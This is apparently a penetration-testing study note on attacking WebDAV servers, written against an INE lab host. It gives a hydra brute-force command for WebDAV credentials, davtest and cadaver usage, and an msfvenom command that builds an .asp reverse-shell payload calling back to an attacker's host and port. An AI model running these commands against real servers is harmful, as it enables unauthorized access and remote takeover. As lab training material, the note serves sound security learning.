[**WebDAV**](https://learn.microsoft.com/en-us/windows/win32/webdav/webdav-portal) (**W**eb **D**istributed **A**uthoring & **V**ersioning) - a set of HTTP protocol extentions used by users to manage file on remote web servers.
- Web server as `File server`.
- Running over Apache or IIS web server (ports `80`/`443`).
- Usually under `http://<target>/webdav/`.
- Credentials (`username` and `password`) necessary for connection to the WebDAV server.

## Exploitation

1. Identify if WebDAV has been configured to run on the IIS or Apache web server.
2. Perform **brute-force attack** on the WebDAV server. Find credentials.

```sh
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt demo.ine.local http-get /webdav/
```

3. Authenticate with the *WebDAV* server and upload a malicious `.asp` **payload** that to execute arbitrary commands or run a reverse shell.

## Tools

> [davtest](https://www.kali.org/tools/davtest/): *scan, authenticate and exploit a WebDAV server, by uploading test executable files which allow for command execution on the target.

```sh
davtest -url <URL> [options]
```

> [cadaver](https://www.kali.org/tools/cadaver/): *File upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation an deletion, property manipulation and resource locking on WebDAV servers.*

```sh
cadaver [OPTIONS] <url>
```

> [msfvenom](https://www.kali.org/tools/metasploit-framework/#msfvenom): > [`**msfvenom**`](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder

```sh
msfvenom -p <PAYLOAD> LHOST=<LOCAL_HOST_IP> LPORT=<PORT> -f <file_type> > shell.asp
```